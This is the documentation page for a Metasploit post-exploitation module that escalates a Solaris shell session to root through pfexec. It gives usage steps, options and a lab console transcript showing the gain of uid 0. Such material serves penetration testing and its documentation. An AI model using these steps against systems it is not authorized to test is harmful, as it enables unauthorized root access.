## Description

  This module attempts to upgrade a shell session to UID `0` using `pfexec`.


## Vulnerable Application

  *  https://docs.oracle.com/cd/E19253-01/816-4557/prbactm-1/index.html
  *  http://www.c0t0d0s0.org/archives/4844-Less-known-Solaris-features-pfexec.html
  *  http://solaris.wikia.com/wiki/Providing_root_privileges_with_pfexec


## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. `use  post/solaris/escalate/pfexec`
  4. `set SESSION <SESSION>`
  5. `run`
  6. Your session should now have *root* privileges


## Options

  **PFEXEC_PATH**

  Path to pfexec (default: `/usr/bin/pfexec`)

  **SHELL_PATH**

  Path to shell (default: `/bin/sh`)


## Scenarios

```
  msf5 > use post/solaris/escalate/pfexec 
  msf5 post(solaris/escalate/pfexec) > sessions -i 1 -c id
  [*] Running 'id' on shell session 1 (172.16.191.221)
  uid=100(user) gid=10(staff)

  msf5 post(solaris/escalate/pfexec) > set verbose true
  verbose => true
  msf5 post(solaris/escalate/pfexec) > set session 1
  session => 1
  msf5 post(solaris/escalate/pfexec) > run

  [*] Trying pfexec as `user' ...
  [*] uid=0(root) gid=0(root)
  [+] Success! Upgrading session ...
  [+] Success! root shell secured
  [*] Post module execution completed
  msf5 post(solaris/escalate/pfexec) > sessions -i 1 -c id
  [*] Running 'id' on shell session 1 (172.16.191.221)
  uid=0(root) gid=0(root)

  msf5 post(solaris/escalate/pfexec) > 
  ```

